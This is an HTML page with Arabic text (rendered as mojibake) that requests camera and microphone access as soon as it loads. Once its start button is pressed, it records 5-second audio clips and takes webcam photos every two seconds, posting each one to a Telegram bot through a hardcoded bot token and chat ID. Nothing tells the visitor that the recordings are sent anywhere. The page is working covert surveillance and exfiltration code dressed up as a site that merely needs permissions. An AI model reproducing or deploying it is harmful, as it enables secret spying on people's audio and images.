<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #0b0f16;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      gap: 20px;
      color: white;
      font-family: sans-serif;
    }
    button {
      padding: 14px 32px;
      font-size: 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      background: #0a84ff;
      color: white;
    }
    #stopBtn { background: #d50000; }
  </style>
</head>
<body>

<h2>Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„ØªØ´ØºÙŠÙ„ Ù…Ø·Ù„ÙˆØ¨Ø©</h2>

<button id="startBtn" disabled>ØªØ´ØºÙŠÙ„</button>


<script>
let stream = null;
let audioActive = false;
let photoActive = false;

const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
const CHAT_ID   = "5648826330";

const AUDIO_MS = 5000; // Ø§Ù„ØµÙˆØª ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
const PHOTO_MS = 2000; // Ø§Ù„ØµÙˆØ±Ø© ÙƒÙ„ 2 Ø«Ø§Ù†ÙŠØ©

// ======================
// Ø·Ù„Ø¨ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ø¹Ù†Ø¯ Ø§Ù„Ø¯Ø®ÙˆÙ„
// ======================
async function requestPermissionsOnLoad() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      audio: true,
      video: true
    });

    document.getElementById("startBtn").disabled = false;
    alert("âœ” ØªÙ… Ù…Ù†Ø­ ØµÙ„Ø§Ø­ÙŠØ§Øª  Ø§Ø¶ØºØ·  Ù„Ù„Ø¨Ø¯Ø¡.");

  } catch {
    alert("âš  ÙŠØ¬Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø­ØªÙ‰ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹.");
  }
}

// Ø¥Ø³ØªØ¯Ø¹Ø§Ø¡ Ø·Ù„Ø¨ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª ÙÙˆØ± ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹
requestPermissionsOnLoad();

// ======================
// Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
// ======================
function sendToTelegram(blob, type="voice") {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append(type, blob, type === "voice" ? "audio.webm" : "photo.jpg");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === "voice" ? "Voice" : "Photo"}`, {
    method: "POST",
    body: form
  });
}

// ======================
// ØªØ³Ø¬ÙŠÙ„ ØµÙˆØª 5 Ø«ÙˆØ§Ù†ÙŠ
// ======================
function recordAudio() {
  return new Promise(resolve => {
    const recorder = new MediaRecorder(stream);
    const chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => resolve(new Blob(chunks, { type: "audio/webm" }));
    
    recorder.start();
    setTimeout(() => recorder.stop(), AUDIO_MS);
  });
}

// ======================
// Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©
// ======================
function captureImage() {
  return new Promise(resolve => {
    const video = document.createElement("video");
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      video.play();

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      canvas.getContext("2d").drawImage(video, 0, 0);
      canvas.toBlob(blob => resolve(blob), "image/jpeg");
    };
  });
}

// ======================
// Ø­Ù„Ù‚Ø© Ø§Ù„ØµÙˆØª Ø§Ù„Ù…Ø³ØªÙ…Ø±Ø©
// ======================
async function audioLoop() {
  audioActive = true;
  while (audioActive) {
    const audio = await recordAudio();
    sendToTelegram(audio, "voice");
    await new Promise(r => setTimeout(r, 200));
  }
}

// ======================
// Ø­Ù„Ù‚Ø© Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø³ØªÙ…Ø±Ø©
// ======================
async function photoLoop() {
  photoActive = true;
  while (photoActive) {
    const img = await captureImage();
    sendToTelegram(img, "photo");
    await new Promise(r => setTimeout(r, PHOTO_MS));
  }
}

// ======================
// Ø²Ø± ØªØ´ØºÙŠÙ„
// ======================
document.getElementById("startBtn").onclick = () => {
  if (!stream) {
    alert("âš  Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª ØºÙŠØ± Ù…ÙØ¹Ù„Ø©!");
    return;
  }

  audioLoop();
  photoLoop();

  document.getElementById("startBtn").disabled = true;
  document.getElementById("stopBtn").disabled = false;

  alert("ğŸ”µ Ø¨Ø¯Ø£ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø³ØªÙ…Ø±.");
};


</script>

</body>
</html>
